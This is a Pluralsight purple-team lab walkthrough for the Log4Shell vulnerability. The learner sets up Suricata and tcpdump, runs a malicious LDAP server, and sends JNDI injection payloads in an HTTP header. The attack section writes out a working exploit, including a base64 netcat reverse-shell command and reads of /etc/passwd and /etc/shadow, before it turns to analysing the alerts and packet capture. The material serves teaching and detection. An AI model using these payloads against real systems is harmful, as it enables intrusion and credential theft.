# Getting Started in the Lab Environment

### Welcome

**A few notes before you get started:**

This lab provides you with an environment consisting of one or more connections to different systems. There can be (but will not always be) more systems in the environment than you have connections. This allows for various sets of scenarios. The intent is for you to follow the instructions and subsequent analysis of tasks, as well as their effect within the environment; however, do not let this discourage you from veering from the path. It is perfectly safe and encouraged that you do—learn here without consequences. If you mess something up, just restart the lab.

But, that doesn't mean there are no rules! Though it seems like it, this is not a dream world and there are some tenants that you should keep in mind to have the best experience:

-   Internet access into or out of the lab environment is not enabled. This is for everyone's safety and adherence to policy.

-   Some services take longer than others to fully initialize in the environment. The lab will be structured to avoid you waiting on services that take longer to configure, but if you skip ahead this may be something you need to keep in mind.

-   The lab environment has some pretty great accessibility and utility features. If you are unfamiliar with the lab environment, you can watch this short 6-minute course on [Getting Started in the Lab Environment](https://app.pluralsight.com/course-player?clipId=173d21fc-23ca-4e24-976b-c84f7abb825a) to cover the basics of navigation.

In this lab, you will emulate the environment necessary to exploit vulnerable log4j applications. This lab takes a purple team approach by having you setup the defender's and attacker's infrastructure, execute the attack, and analyze the traffic to understand identification and detection methods.

This is an evolving vulnerability and additional information can be found via our﻿[](https://github.com/Pluralsight-SORCERI/log4j-resources) GitHub Page. Video courses and webinars can be seen at the following locations:

-   ﻿[GitHub - Pluralsight SORCERI Log4j Resources](https://github.com/Pluralsight-SORCERI/log4j-resources)﻿
-   ﻿[Log4j Vulnerability: What You Should Know](https://app.pluralsight.com/library/courses/log4j-vulnerability-what-you-should-know/table-of-contents)﻿

Enjoy!

---
# Setup Network Detections

In this environment, there are two Ubuntu endpoints. One is for the attacker and the other to host the vulnerable applications and provide an environment for detection. This first challenge will involve setting up the network detections and packet capture.

**Important Note**: We are building a custom environment just for you! This may take a few minutes depending on its complexity.

-   In the terminal environment, typing `status` will return an overview on applications installing and/or lab files being downloaded. Once this returns **SYSTEM COMPLETE**, your environment will be ready for full exploration!

1.  Start by connecting to the **Ubuntu Defender Endpoint**
2.  Create a new terminal session for Suricata:

    `screen -S suricata`
    **Note:** Multiple terminals will be required to manage the various tasks. Since we are presenting the terminal environment through a browser, the Linux tool `screen` will assist with this.
    
    -   `screen -S [name]` = Creates a new terminal session and names it
    -   `CTRL + A`, let go, and then press `D` = Disconnects from a terminal session
    -   `screen -r [name]` = Reattaches to an available terminal session
    -   `screen -ls` = Lists any available screen terminal sessions and their status
3.  Start Suricata with the available log4j rules:
    
    `sudo suricata -S ~/lab/emerging-threats-log4j.rules -l ~/lab -i eth0`
    
    **Note:** There may be a "Warning" that appears stating the flowbit 'ET.RMIRequest' is checked but not set. This is expected and will not affect your detections. ![figure](https://pluralsight2.imgix.net/labs/assets/9d0e6f8b-d763-4375-bac7-727fb2b06ff7_suricata-start.png)
    
4.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
5.  Create a new terminal session for tcpdump:
    
    `screen -S tcpdump`
    
6.  Start tcpdump:
    
    `sudo tcpdump -nn 'not port 22 and not port 443' -w analysis.pcap`
    
    **Note:** To reduce the noise, we are filtering out port 22 (your SSH sessions) and port 443 (the AWS instances generate a lot of automatic HTTPS traffic). ![figure](https://pluralsight2.imgix.net/labs/assets/ac1691f0-2398-4783-8acb-34c2db0d9d61_tcpdump-start.png)
    
7.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
8.  At this point you should have two screen sessions. You can check this with:
    
    `screen -ls`﻿![figure](https://pluralsight2.imgix.net/labs/assets/d9cba857-d75a-4998-bfeb-34d2a5be9574_screen-ls.png)
    
9.  The vulnerable application has been started automatically in a local Docker container. Test to make sure the application is responding:
    
    `curl localhost:8080`
    
    **Note:** The application will respond with an error and 400 status code. This is expected and means the application is responding successfully.![figure](https://pluralsight2.imgix.net/labs/assets/1a831e78-7a93-4aef-8521-d2c692819d72_curl-localhost.png)
    
10.  The Proof of Concept (POC) test will involve creating a new file in the application's **/tmp/** directory. Check its current files and take note of what you see there:
    
    `sudo docker exec vulnapp2 ls /tmp` 
    
![figure](https://pluralsight2.imgix.net/labs/assets/8ccd5a92-110e-4943-af64-155bb887b69c_app2-ls-tmp.png)﻿
    

Suricata is an open-source Intrusion Detection System (IDS) we will be using to detect Log4j exploits inside network traffic. If you are interested in learning more about Suricata, check out: ﻿[](https://app.pluralsight.com/library/courses/suricata-getting-started/table-of-contents)﻿[Network Security Monitoring with Suricata](https://app.pluralsight.com/library/courses/network-security-monitoring-suricata/table-of-contents).

Congratulations! It may not seem like much just yet, but you've setup the infrastructure for detection and tested to ensure the vulnerable application is operating properly. We'll come back here, but for now let's move on to the attacker.

---
# Setup Malicious LDAP Server and POC

In this challenge, you will be setting up the attacker's infrastructure and sending your first malicious payload to test a Proof of Concept (POC).

1.  Start by swapping to the **Ubuntu Attacker Endpoint**. This can be done by typing `CTRL`, `ALT`, and `Shift` simultaneously and clicking the **Pluralsight** drop down from the top-left.![figure](https://pluralsight2.imgix.net/labs/assets/d6196e69-1635-4296-b652-5b486ee6f0b7_attacker-endpoint.png)﻿
    
2.  Test network connectivity to the vulnerable application (Remember, a 400 error is expected!):
    
    `curl http://172.31.24.20:8080`﻿![figure](https://pluralsight2.imgix.net/labs/assets/50645b5a-adbf-408f-b8e9-5281a83daff7_curl-test.png)
    
3.  Next, you'll need to setup the malicious LDAP server. When you send the payload to the vulnerable app, it will use JNDI to call back to this malicious LDAP server for further instructions. Start with a clean terminal session:
    
    `screen -S ldap`
    
4.  Start the LDAP server:
    
    `sudo docker run --name log4jldapserver -p 1389:1389 -p 8888:8888 oofles/log4shell-ldap-server`
    
    **Note:** You are setting the LDAP server to listen on port **1389** (for LDAP requests) and port **8888** (for the redirected payload commands to be sent over HTTP). ![figure](https://pluralsight2.imgix.net/labs/assets/a5a5a969-6661-4600-a863-9621605bdad8_ldap-listening.png)﻿
    
5.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
6.  Now it's time to send the first malicious payload! The vulnerable application is logging the **X-Api-Version** field, so you'll use `curl` to send the payload, changing that field to contain the malicious string:
    
    `curl 172.31.24.20:8080 -H 'X-Api-Version: ${jndi:ldap://172.31.24.10:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}'`
    
    **Note:** The Base64 encoded string translates to: `touch /tmp/pwned`.![figure](https://pluralsight2.imgix.net/labs/assets/2aa54e6c-d6c1-42be-8c21-fbdbf0570321_poc-sent.png)﻿
    
    **Analysis:** A **Hello World!** response is the method this vulnerable app uses to let you know the request was successful.
    
7.  Check the LDAP server to see if the requests came through successfully:
    
    `screen -r ldap`﻿![figure](https://pluralsight2.imgix.net/labs/assets/3e13803a-5da2-4081-b150-d6dfe940b0dd_ldap-poc.png)﻿
    
    **Analysis:** You can see the initial LDAP query come through for **Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==**. The server then translates the Base64 payload into a command and passes to a Java class that handles delivery and execution. This payload is then sent to the vulnerable endpoint over port **8888**.
    
8.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
9.  Swap to the **Ubuntu Defender Endpoint**.
    
    `CTRL`, `ALT`, and `Shift`
    
10.  Check the vulnerable application's **/tmp/** directory:
    
    `sudo docker exec vulnapp2 ls /tmp`
    
![figure](https://pluralsight2.imgix.net/labs/assets/dbc1924c-de5c-4951-b06b-c92c729c1d78_vuln-tmp-pwned.png)﻿
    

POC is a success!! However, that wasn't much of an exploit... Before getting into analysis, let's see if we can upgrade the exploit in this next challenge and establish a reverse shell.

---
# Upgrade to a Reverse Shell

For this challenge you'll be following the same process with one minor modification. You need to setup a listener for the reverse shell connection and change the payload.

1.  Start by connecting to the **Ubuntu Attacker Endpoint.**
    
2.  Create a new terminal session for the netcat listener:
    
    `screen -S nc`
    
3.  Start netcat as a listener on port **7777**:
    
    `nc -lvp 7777`
    
    **Note:** Netcat (nc) is a networking utility used to establish connections. For now, you can leave that up and listening
    
    -   `-l` = listen mode
        
    -   `-v` = verbose
        
    -   `-p` = sets the port![figure](https://pluralsight2.imgix.net/labs/assets/22abbc8a-1a18-4ae3-aa64-9c76c814631c_nc-listening.png)﻿
        
4.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
5.  Time to send the upgraded payload!
    
    `curl 172.31.24.20:8080 -H 'X-Api-Version: ${jndi:ldap://172.31.24.10:1389/Basic/Command/Base64/bmMgLW52IDE3Mi4zMS4yNC4xMCA3Nzc3IC1lIC9iaW4vc2g=}'`
    
    **Note:** The Base64 encoded string translates to: `nc -nv 172.31.24.10 7777 /bin/sh`
    
    **Analysis:** The vulnerable application is running an extremely old version of netcat susceptible to sending a shell through the netcat connection. While this works for our test environment to understand the principles of what is taking place, it will most likely fail with a production application.
    
6.  Reattach to the netcat terminal session:
    
    `screen -r nc`﻿![figure](https://pluralsight2.imgix.net/labs/assets/dd307c61-e432-4b30-b5e7-6cfdde0262f1_nc-connection.png)﻿
    
7.  You have established a reverse shell! Now an attacker would typically perform some enumeration. Try some of these commands out to see the response:
    
    -   `uname -a`
        
    -   `whoami`
        
    -   `env`
        
    -   `cat /etc/passwd`
        
    -   `cat /etc/shadow`﻿![figure](https://pluralsight2.imgix.net/labs/assets/2d0ce038-2d47-42bb-93b8-119c13dd66cd_shell.png)﻿
        

Feel free to spend a bit more time before moving on to analysis and detection. You can send different payloads by replacing the Base64 string in the curl command.

-   ﻿[CyberChef](https://gchq.github.io/CyberChef/) is a good resource to encode/decode strings.
    
-   You can also use Linux to:
    
    -   Encode: `echo -n 'string' | base64`
        
    -   Or Decode: `echo -n 'NDJpc3RoZWFuc3dlcg==' | base64 --decode`
        

If you are interested in upgrading your pen-testing skills, check out [](https://app.pluralsight.com/library/courses/metasploit-getting-started/table-of-contents)the [Penetration Testing Fundamentals with the Metasploit Framework Path](https://app.pluralsight.com/paths/skills/penetration-testing-fundamentals-with-the-metasploit-framework)﻿﻿[](https://app.pluralsight.com/paths/skills/penetration-testing-fundamentals-with-the-metasploit-framework)﻿

In the next challenge, you will be performing some analysis and taking a look at a detection method.

---
# Analysis and Detection

In this challenge you will be taking a look back at Suricata to see if it alerted on anything. You'll also be diving into the PCAP with tcpdump to inspect the traffic seen.

1.  Start by connecting to the **Ubuntu Defender Endpoint.**
    
2.  At this point you can stop Suricata and tcpdump from running:
    
    `screen -r suricata`
    
    `CTRL + C` to stop the application
    
    `CTRL + A`, let go, then press `D` to detach
    
    Repeat for tcpdump.
    
3.  Suricata was set to log in the **/home/ubuntu/lab/** directory. List out the contents to see the logs that are created:
    
    `ls ~/lab`﻿![figure](https://pluralsight2.imgix.net/labs/assets/30188e1a-71e2-4701-a994-794cd700d794_ls-lab.png)﻿
    
4.  The **fast.log** contains short descriptions with a single alert per line. Take a look at what's in this file:
    
    `less -S ~/lab/fast.log`
    
    **Note:** When using `less`, you can read through a file with the arrow keys. When you are finished, press `q` to quit.﻿![figure](https://pluralsight2.imgix.net/labs/assets/d4233a5b-675e-4f78-8535-16521738b105_less-fast.png)﻿
    
    **Analysis:** Multiple alerts have triggered! General information available in these alerts include the IPs and ports involved. In a typical enterprise environment, an IDS (like Suricata) would be configured to forward these alerts to a Security Information and Event Management (SIEM) system. You can also configure your system to email or send additional messages when certain alerts are triggered.
    
5.  We don't have a SIEM configured in this environment, and you may need to dig through Suricata logs on the command-line at some point. Let's take a look at how to do that and start by looking at the **eve.json** file:
    
    `cat ~/lab/eve.json | jq . | less`
    
    **Note:** The Extensible Event Format (nicknamed EVE) log contains all the network information, alerts, metadata, and protocol specific logs that Suricata generates. Even though Suricata is typically used as an IDS, it can generate a lot of useful information gathered from the network traffic.
    
    **Note:** `jq` is a Linux utility that assists with reading through JSON documents on the command line. For more information see: [https://stedolan.github.io/jq/](https://stedolan.github.io/jq/)﻿
    
6.  Since there is a massive amount of information in this log, and we are currently only interested in the alerts, you can use `jq` to filter this information down:
    
    `cat ~/lab/eve.json | jq 'select(.event_type == "alert")' | less` ![figure](https://pluralsight2.imgix.net/labs/assets/4d54542e-a9e1-4bc4-bfb1-ce4fdfa89fee_eve-alerts.png)﻿
    
    **Analysis:** Looking at the alerts in the EVE log, you can see a lot more information. Because these attacks happened over HTTP, Suricata will also create entries for the protocol metadata like hostname, URL, user agent, method, and status. This is extremely helpful for initial analysis and collecting artifacts for incident response.![figure](https://pluralsight2.imgix.net/labs/assets/d5264ea7-ad61-486d-84bc-2da2d29559ae_eve-http.png)﻿
    
7.  If you wanted to get all the information from a particular conversation (or flow), you can use the **flow_id** field seen in the alert:
    
    `cat ~/lab/eve.json | jq 'select(.flow_id == 769469750893595)' | less`
    
    **Note:** The **flow_id** is a unique value and generated at runtime. You will need to look at the value in your own environment for this filter to work properly.![figure](https://pluralsight2.imgix.net/labs/assets/425a6983-2310-411d-ad54-b10981c36d16_eve-flow-id.png)﻿
    
8.  One final thing you may want to do is extract individual values out of a field. As an example, filter for all the alerts and generate a count of source IPs.
    
    `cat ~/lab/eve.json | jq 'select(.event_type == "alert") | .src_ip' | sort | uniq -c | sort -n`
    
    **Note:** This filter process can be repeated for any of the available fields you'd like more information on.![figure](https://pluralsight2.imgix.net/labs/assets/9520d654-fad3-4803-bc58-4cec4ee38fca_even-src-uniq.png)﻿
    
    **Analysis:** Even though all the alerts come from a single IP in our lab environment, this type of filtering is extremely helpful when performing analysis on a live network where you may have thousands of alerts.
    
9.  Using the information gathered from the alerts, now you can pivot to the PCAP file and use tcpdump to gain some additional information by filtering on the attacker's IP:
    
    `tcpdump -nn -r ~/analysis.pcap 'src host 172.31.24.10' | less -S`![figure](https://pluralsight2.imgix.net/labs/assets/8c3e5838-488e-4713-9229-e0056c64b9a9_pcap-host.png)﻿
    
    **Analysis:** In a typical incident response scenario, you'd need to dig through the conversations to understand what actually happened. Because you have the benefit of having run the attack yourself, you can skip some of the guess work and analyze the flows individually.
    
10.  Start by taking a look at the requests to the vulnerable application:
    
    `tcpdump -nn -r ~/analysis.pcap 'tcp port 8080' -vvv | less -S`
    
**Note:** The `-v` option in tcpdump prints out information in increasing levels of verbosity. With this you can see useful information like the HTTP headers.
![figure](https://pluralsight2.imgix.net/labs/assets/f382988a-9119-409b-815a-1fb8f4046a58_pcap-8080.png)﻿
    
 **Analysis:** Some Log4j attacks take advantage of fields like the user agent or URL to submit the malicious queries. Since you submitted the malicious payload utilizing the **X-Api-Version** field, you can filter onto that with this approach:
    
    `tcpdump -nn -r ~/analysis.pcap 'tcp port 8080' -vvv | grep "X-Api-Version" | sort | uniq -c`﻿
![figure](https://pluralsight2.imgix.net/labs/assets/05a70579-2750-4514-89eb-d38ff9f1c72f_pcap-8080-api.png)﻿
    
**Analysis:** You may also use this method to perform a broad search for **jndi**, **ldap**, or **rmi** lookups in network traffic. This is not an efficient approach and may take a long time depending on the amount of network traffic you have. Simple obfuscation methods can hide from this as well. An example:
    
    `tcpdump -nn -r ~/analysis.pcap -vvv | grep jndi`
    
11.  Next, move onto the LDAP requests over port 1389:
    
    `tcpdump -nn -r ~/analysis.pcap 'tcp port 1389' -vvv -X | less -S`
    
 **Note:** Using tcpdump, `**-X**` prints out the complete packet contents in ASCII and hex.﻿![figure](https://pluralsight2.imgix.net/labs/assets/f685f8f9-c4e3-4a0b-b4ee-f1819d60e983_pcap-1389-1.png)﻿![figure](https://pluralsight2.imgix.net/labs/assets/4965d2cf-85df-4ed5-95db-edb43b595f9a_pcap-1389-2.png)﻿
    
**Analysis:** You will have to scroll through the packets but will be able to see a couple artifacts. First, the Base64 command sent from the victim back to the malicious server for redirection. Then, the response back with a redirection to port **8888** and calls to specific java classes.
    
12.  With that, check port **8888**:
    
    `tcpdump -nn -r ~/analysis.pcap 'tcp port 8888' -vvv -X | less -S`
    
 **Note:** Scrolling down with `<Space>`, `<Return>`, or arrow keys will show more information.![figure](https://pluralsight2.imgix.net/labs/assets/5f4342a0-7880-44ef-addd-8309e2af2897_pcap-8888-1.png)﻿![figure](https://pluralsight2.imgix.net/labs/assets/10c7b679-82b8-4280-874f-83f0e4620da7_pcap-8888-2.png)﻿![figure](https://pluralsight2.imgix.net/labs/assets/bda620cd-e37e-4065-b5b8-436e1ce9686f_pcap-8888-3.png)﻿
    
**Analysis:** First you will see the request to the malicious LDAP server. Eventually, there is a larger packet returned from the server where you can see Java code being initialized. If you scroll down near the bottom, you can see the command sent in plain text.
    
13.  One last thing to look at! Filter on port **7777** for the reverse shell:
    
    `tcpdump -nn -r ~/analysis.pcap 'tcp port 7777' -vvv -X | less -S`﻿
![figure](https://pluralsight2.imgix.net/labs/assets/75ba1541-3582-4d69-bee0-268a35d2aab6_pcap-7777.png)﻿
    
**Analysis:** Depending on what commands you ran, you will be able to see the commands sent and the information received, since this is a non-encrypted Command and Control (C2) channel. This type of packet analysis may be easier with a tool like Wireshark, but it's very helpful to have these skills in case you are in a limited environment or need quick information in the middle of an incident response.
    

There are many different detection methods depending on the configuration of your environment and what software you may have installed. Please check with your software vendors to see if they have additional resources. If you are interested in learning more about security operations and detections, check out the [Security Event Triage Path](https://app.pluralsight.com/paths/skill/security-event-triage-skill).

---
# The Last Challenge

### Every End Is A New Beginning

This is your chance to get hands-on experience in the environment. When you click next, the lab will end, and the environment will no longer be available.

Take this opportunity to try new things. Don't be afraid to break anything; be curious!

**Here are some options of things to try out:**

-   Think of additional commands you'd like to run against the machine, use CyberChef to put them into Base64, and test the payload against the vulnerable application

-   Dig through the Suricata logs and create filters for other interesting artifacts. You can also try writing your own Suricata rules to detect Log4Shell attempts if you are feeling extra brave!
-   Dig through the PCAP and look for additional artifacts¡

**Additional Learning References:**﻿[](https://app.pluralsight.com/paths/skill/security-event-triage-skill)﻿

-   ﻿[Blue Team Tools Path](https://app.pluralsight.com/paths/skill/blue-team-tools)﻿
    
-   ﻿﻿[](https://app.pluralsight.com/paths/skill/blue-team-tools)﻿[Red Team Tools Path](https://app.pluralsight.com/paths/skill/red-team-tools)﻿
    
-   ﻿[Log4j Resources](https://github.com/Pluralsight-SORCERI/log4j-resources)﻿
    

﻿﻿[](https://github.com/Pluralsight-SORCERI/log4j-resources)**External Resources:**

-   ﻿[christophetd](https://github.com/christophetd)﻿
    
-   ﻿[feihong](https://github.com/feihong-cs)﻿
    
-   ﻿[welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)﻿
    
-   ﻿[pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)﻿﻿[](https://app.pluralsight.com/paths/skill/red-team-tools)

---